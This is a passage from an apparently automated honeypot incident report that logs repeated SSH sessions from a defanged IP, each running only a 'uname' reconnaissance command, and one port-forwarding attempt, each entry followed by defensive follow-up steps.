| `2026-07-24 15:08:01` | `cowrie.login.success` |
| `2026-07-24 15:08:02` | `cowrie.session.params` |
| `2026-07-24 15:08:02` | `cowrie.command.input` |
| `2026-07-24 15:08:02` | `cowrie.log.closed` |
| `2026-07-24 15:08:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-581f088dd4b5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:08 |
| **Last Seen** | 2026-07-24 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:08:06` | `cowrie.session.connect` |
| `2026-07-24 15:08:06` | `cowrie.client.version` |
| `2026-07-24 15:08:06` | `cowrie.client.kex` |
| `2026-07-24 15:08:07` | `cowrie.login.success` |
| `2026-07-24 15:08:08` | `cowrie.session.params` |
| `2026-07-24 15:08:08` | `cowrie.command.input` |
| `2026-07-24 15:08:08` | `cowrie.log.closed` |
| `2026-07-24 15:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1e3aca7bb31

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:08 |
| **Last Seen** | 2026-07-24 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:08:12` | `cowrie.session.connect` |
| `2026-07-24 15:08:12` | `cowrie.client.version` |
| `2026-07-24 15:08:12` | `cowrie.client.kex` |
| `2026-07-24 15:08:13` | `cowrie.login.success` |
| `2026-07-24 15:08:14` | `cowrie.session.params` |
| `2026-07-24 15:08:14` | `cowrie.command.input` |
| `2026-07-24 15:08:14` | `cowrie.log.closed` |
| `2026-07-24 15:08:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee78b2a87259

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:08 |
| **Last Seen** | 2026-07-24 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:08:18` | `cowrie.session.connect` |
| `2026-07-24 15:08:18` | `cowrie.client.version` |
| `2026-07-24 15:08:19` | `cowrie.client.kex` |
| `2026-07-24 15:08:19` | `cowrie.login.success` |
| `2026-07-24 15:08:20` | `cowrie.session.params` |
| `2026-07-24 15:08:20` | `cowrie.command.input` |
| `2026-07-24 15:08:20` | `cowrie.log.closed` |
| `2026-07-24 15:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab3cfc9bc86b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:08 |
| **Last Seen** | 2026-07-24 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:08:25` | `cowrie.session.connect` |
| `2026-07-24 15:08:25` | `cowrie.client.version` |
| `2026-07-24 15:08:25` | `cowrie.client.kex` |
| `2026-07-24 15:08:25` | `cowrie.login.success` |
| `2026-07-24 15:08:26` | `cowrie.session.params` |
| `2026-07-24 15:08:26` | `cowrie.command.input` |
| `2026-07-24 15:08:26` | `cowrie.log.closed` |
| `2026-07-24 15:08:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d7e8581b502

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:08 |
| **Last Seen** | 2026-07-24 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:08:31` | `cowrie.session.connect` |
| `2026-07-24 15:08:31` | `cowrie.client.version` |
| `2026-07-24 15:08:31` | `cowrie.client.kex` |
| `2026-07-24 15:08:31` | `cowrie.login.success` |
| `2026-07-24 15:08:32` | `cowrie.session.params` |
| `2026-07-24 15:08:32` | `cowrie.command.input` |
| `2026-07-24 15:08:32` | `cowrie.log.closed` |
| `2026-07-24 15:08:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-296f1267e0fe

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:08 |
| **Last Seen** | 2026-07-24 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:08:37` | `cowrie.session.connect` |
| `2026-07-24 15:08:37` | `cowrie.client.version` |
| `2026-07-24 15:08:37` | `cowrie.client.kex` |
| `2026-07-24 15:08:37` | `cowrie.login.success` |
| `2026-07-24 15:08:38` | `cowrie.session.params` |
| `2026-07-24 15:08:38` | `cowrie.command.input` |
| `2026-07-24 15:08:38` | `cowrie.log.closed` |
| `2026-07-24 15:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84fb78f50375

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:08 |
| **Last Seen** | 2026-07-24 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:08:43` | `cowrie.session.connect` |
| `2026-07-24 15:08:43` | `cowrie.client.version` |
| `2026-07-24 15:08:43` | `cowrie.client.kex` |
| `2026-07-24 15:08:43` | `cowrie.login.success` |
| `2026-07-24 15:08:44` | `cowrie.session.params` |
| `2026-07-24 15:08:44` | `cowrie.command.input` |
| `2026-07-24 15:08:44` | `cowrie.log.closed` |
| `2026-07-24 15:08:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42cb24533ed3

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:08 |
| **Last Seen** | 2026-07-24 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:08:49` | `cowrie.session.connect` |
| `2026-07-24 15:08:49` | `cowrie.client.version` |
| `2026-07-24 15:08:49` | `cowrie.client.kex` |
| `2026-07-24 15:08:49` | `cowrie.login.success` |
| `2026-07-24 15:08:50` | `cowrie.session.params` |
| `2026-07-24 15:08:50` | `cowrie.command.input` |
| `2026-07-24 15:08:50` | `cowrie.log.closed` |
| `2026-07-24 15:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89a708f9f6d8

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:08 |
| **Last Seen** | 2026-07-24 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:08:55` | `cowrie.session.connect` |
| `2026-07-24 15:08:55` | `cowrie.client.version` |
| `2026-07-24 15:08:55` | `cowrie.client.kex` |
| `2026-07-24 15:08:56` | `cowrie.login.success` |
| `2026-07-24 15:08:56` | `cowrie.session.params` |
| `2026-07-24 15:08:56` | `cowrie.command.input` |
| `2026-07-24 15:08:56` | `cowrie.log.closed` |
| `2026-07-24 15:08:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6adc093a885

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:09 |
| **Last Seen** | 2026-07-24 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:09:01` | `cowrie.session.connect` |
| `2026-07-24 15:09:01` | `cowrie.client.version` |
| `2026-07-24 15:09:01` | `cowrie.client.kex` |
| `2026-07-24 15:09:02` | `cowrie.login.success` |
| `2026-07-24 15:09:03` | `cowrie.session.params` |
| `2026-07-24 15:09:03` | `cowrie.command.input` |
| `2026-07-24 15:09:03` | `cowrie.log.closed` |
| `2026-07-24 15:09:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be66b05bd5fc

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:09 |
| **Last Seen** | 2026-07-24 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:09:08` | `cowrie.session.connect` |
| `2026-07-24 15:09:08` | `cowrie.client.version` |
| `2026-07-24 15:09:08` | `cowrie.client.kex` |
| `2026-07-24 15:09:08` | `cowrie.login.success` |
| `2026-07-24 15:09:09` | `cowrie.session.params` |
| `2026-07-24 15:09:09` | `cowrie.command.input` |
| `2026-07-24 15:09:09` | `cowrie.log.closed` |
| `2026-07-24 15:09:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32e5ead1e716

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:09 |
| **Last Seen** | 2026-07-24 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:09:14` | `cowrie.session.connect` |
| `2026-07-24 15:09:14` | `cowrie.client.version` |
| `2026-07-24 15:09:14` | `cowrie.client.kex` |
| `2026-07-24 15:09:15` | `cowrie.login.success` |
| `2026-07-24 15:09:15` | `cowrie.session.params` |
| `2026-07-24 15:09:15` | `cowrie.command.input` |
| `2026-07-24 15:09:16` | `cowrie.log.closed` |
| `2026-07-24 15:09:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d02060ff2bf

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:09 |
| **Last Seen** | 2026-07-24 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:09:21` | `cowrie.session.connect` |
| `2026-07-24 15:09:21` | `cowrie.client.version` |
| `2026-07-24 15:09:21` | `cowrie.client.kex` |
| `2026-07-24 15:09:21` | `cowrie.login.success` |
| `2026-07-24 15:09:22` | `cowrie.session.params` |
| `2026-07-24 15:09:22` | `cowrie.command.input` |
| `2026-07-24 15:09:22` | `cowrie.log.closed` |
| `2026-07-24 15:09:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14c7102a725b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:09 |
| **Last Seen** | 2026-07-24 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:09:27` | `cowrie.session.connect` |
| `2026-07-24 15:09:27` | `cowrie.client.version` |
| `2026-07-24 15:09:27` | `cowrie.client.kex` |
| `2026-07-24 15:09:28` | `cowrie.login.success` |
| `2026-07-24 15:09:28` | `cowrie.session.params` |
| `2026-07-24 15:09:28` | `cowrie.command.input` |
| `2026-07-24 15:09:29` | `cowrie.log.closed` |
| `2026-07-24 15:09:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12e4df6fb559

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:09 |
| **Last Seen** | 2026-07-24 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:09:34` | `cowrie.session.connect` |
| `2026-07-24 15:09:34` | `cowrie.client.version` |
| `2026-07-24 15:09:34` | `cowrie.client.kex` |
| `2026-07-24 15:09:34` | `cowrie.login.success` |
| `2026-07-24 15:09:35` | `cowrie.session.params` |
| `2026-07-24 15:09:35` | `cowrie.command.input` |
| `2026-07-24 15:09:35` | `cowrie.log.closed` |
| `2026-07-24 15:09:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d51a3602d0a5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:09 |
| **Last Seen** | 2026-07-24 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:09:40` | `cowrie.session.connect` |
| `2026-07-24 15:09:40` | `cowrie.client.version` |
| `2026-07-24 15:09:40` | `cowrie.client.kex` |
| `2026-07-24 15:09:41` | `cowrie.login.success` |
| `2026-07-24 15:09:41` | `cowrie.session.params` |
| `2026-07-24 15:09:41` | `cowrie.command.input` |
| `2026-07-24 15:09:42` | `cowrie.log.closed` |
| `2026-07-24 15:09:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-035703cb30cc

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:09 |
| **Last Seen** | 2026-07-24 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:09:46` | `cowrie.session.connect` |
| `2026-07-24 15:09:46` | `cowrie.client.version` |
| `2026-07-24 15:09:46` | `cowrie.client.kex` |
| `2026-07-24 15:09:47` | `cowrie.login.success` |
| `2026-07-24 15:09:47` | `cowrie.session.params` |
| `2026-07-24 15:09:47` | `cowrie.command.input` |
| `2026-07-24 15:09:48` | `cowrie.log.closed` |
| `2026-07-24 15:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b70bae442cd

| Field | Detail |
|---|---|
| **Source IP** | `211.178.165[.]251` |
| **First Seen** | 2026-07-24 15:09 |
| **Last Seen** | 2026-07-24 15:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:09:50` | `cowrie.session.connect` |
| `2026-07-24 15:09:51` | `cowrie.client.version` |
| `2026-07-24 15:09:51` | `cowrie.client.kex` |
| `2026-07-24 15:09:53` | `cowrie.login.success` |
| `2026-07-24 15:09:54` | `cowrie.direct-tcpip.request` |
| `2026-07-24 15:09:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.178.165[.]251` to AbuseIPDB if not already reported
- [ ] Block `211.178.165[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fad04827a9e3

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:09 |
| **Last Seen** | 2026-07-24 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:09:53` | `cowrie.session.connect` |
| `2026-07-24 15:09:53` | `cowrie.client.version` |
| `2026-07-24 15:09:53` | `cowrie.client.kex` |
| `2026-07-24 15:09:53` | `cowrie.login.success` |
| `2026-07-24 15:09:54` | `cowrie.session.params` |
| `2026-07-24 15:09:54` | `cowrie.command.input` |
| `2026-07-24 15:09:54` | `cowrie.log.closed` |
| `2026-07-24 15:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1607019c469d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:09 |
| **Last Seen** | 2026-07-24 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:09:59` | `cowrie.session.connect` |
| `2026-07-24 15:09:59` | `cowrie.client.version` |
| `2026-07-24 15:09:59` | `cowrie.client.kex` |
| `2026-07-24 15:09:59` | `cowrie.login.success` |
| `2026-07-24 15:10:00` | `cowrie.session.params` |
| `2026-07-24 15:10:00` | `cowrie.command.input` |
| `2026-07-24 15:10:00` | `cowrie.log.closed` |
| `2026-07-24 15:10:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0ab9020c698

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:10 |
| **Last Seen** | 2026-07-24 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:10:05` | `cowrie.session.connect` |
| `2026-07-24 15:10:05` | `cowrie.client.version` |
| `2026-07-24 15:10:05` | `cowrie.client.kex` |
| `2026-07-24 15:10:06` | `cowrie.login.success` |
| `2026-07-24 15:10:06` | `cowrie.session.params` |
| `2026-07-24 15:10:06` | `cowrie.command.input` |
| `2026-07-24 15:10:07` | `cowrie.log.closed` |
| `2026-07-24 15:10:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe982a036203

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:10 |
| **Last Seen** | 2026-07-24 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:10:11` | `cowrie.session.connect` |
| `2026-07-24 15:10:11` | `cowrie.client.version` |
| `2026-07-24 15:10:11` | `cowrie.client.kex` |
| `2026-07-24 15:10:12` | `cowrie.login.success` |
| `2026-07-24 15:10:13` | `cowrie.session.params` |
| `2026-07-24 15:10:13` | `cowrie.command.input` |
| `2026-07-24 15:10:13` | `cowrie.log.closed` |
| `2026-07-24 15:10:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4210d34e1ad

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:10 |
| **Last Seen** | 2026-07-24 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:10:17` | `cowrie.session.connect` |
| `2026-07-24 15:10:17` | `cowrie.client.version` |
| `2026-07-24 15:10:18` | `cowrie.client.kex` |
| `2026-07-24 15:10:18` | `cowrie.login.success` |
| `2026-07-24 15:10:19` | `cowrie.session.params` |
| `2026-07-24 15:10:19` | `cowrie.command.input` |
| `2026-07-24 15:10:19` | `cowrie.log.closed` |
| `2026-07-24 15:10:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8c8ef764dfa

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:10 |
| **Last Seen** | 2026-07-24 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:10:24` | `cowrie.session.connect` |
| `2026-07-24 15:10:24` | `cowrie.client.version` |
| `2026-07-24 15:10:24` | `cowrie.client.kex` |
| `2026-07-24 15:10:24` | `cowrie.login.success` |
| `2026-07-24 15:10:25` | `cowrie.session.params` |
| `2026-07-24 15:10:25` | `cowrie.command.input` |
| `2026-07-24 15:10:25` | `cowrie.log.closed` |
| `2026-07-24 15:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d38a853ca787

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:10 |
| **Last Seen** | 2026-07-24 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 15:10:30` | `cowrie.session.connect` |
| `2026-07-24 15:10:30` | `cowrie.client.version` |
| `2026-07-24 15:10:31` | `cowrie.client.kex` |
| `2026-07-24 15:10:31` | `cowrie.login.success` |
| `2026-07-24 15:10:32` | `cowrie.session.params` |
| `2026-07-24 15:10:32` | `cowrie.command.input` |
| `2026-07-24 15:10:32` | `cowrie.log.closed` |
| `2026-07-24 15:10:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]144` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36a394bcbf03

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]144` |
| **First Seen** | 2026-07-24 15:10 |
| **Last Seen** | 2026-07-24 15:10 |
| **Session Duration** | 1s |
